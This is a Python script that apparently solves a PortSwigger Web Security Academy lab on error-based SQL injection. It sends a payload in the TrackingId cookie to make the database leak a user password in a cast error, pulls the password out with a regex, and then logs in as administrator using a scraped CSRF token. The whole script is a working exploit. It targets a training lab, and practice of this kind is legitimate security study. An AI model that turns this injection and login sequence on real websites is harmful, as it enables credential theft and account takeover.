#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a4e000f037eb3c083b9377b00be00c3.web-security-academy.net'

session = requests.Session()

payload = "'+AND+1=CAST((SELECT password FROM users LIMIT 1) AS int)--+-"
cookies = {
    'TrackingId' : payload,
}

response = session.get(
    url + "/filter?category=Gifts",
    cookies=cookies,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
pattern = r"\w{20}"
match = re.search(pattern, response.text)
account = match.group()
print("mật khẩu là: ", account)

response = session.get(
    url + "/login",
    verify=False,
)
soup = BeautifulSoup(response.text,'html.parser')
csrf= soup.find('input', {'name': 'csrf'})['value']
data= {
    'username' : 'administrator',
    'password' : account,
    'csrf' : csrf,
}
response = session.post(
    url + "/login",
    data=data,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
